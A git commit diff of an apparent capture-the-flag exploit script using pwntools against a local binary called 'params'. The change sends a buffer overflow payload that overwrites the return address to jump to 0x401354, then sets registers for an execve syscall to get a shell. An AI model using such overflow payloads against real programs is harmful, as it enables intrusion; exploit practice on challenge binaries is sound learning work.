3fa206199a5954e0d66efd477a1e0d06c9ed2bd8
condor0010 <condor0010@laptop>
2022-06-23 14:12:50 -0400

    p64 exusts, im kinda dumb

--- Params/params.py
+++ Params/params.py
@@ -5,12 +5,22 @@ target = process("./params")
 print(target.recvline()) # hey bb
 print(target.recvline()) # whats ur name
 
-target.sendline(b"louie") # dont think this matters, probobly wrong but start with assumption
-print("louie")
+target.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x54\x13\x40\x00") # jump to 0x0000000000401354
+print("overwrote return adress")
 
 print(target.recvline()) # hello $NAME
 print(target.recvline()) # you can set my registers any day of the week
 
-target.recvuntil(b"rax:")
+#target.recvuntil(":")
 target.sendline(b"59") # exec syscall
+target.sendline(b"0")
+target.sendline(b"0")
+target.sendline(b"0")
+target.sendline(b"0")
+target.sendline(b"0")
+
+
+
+
+
 
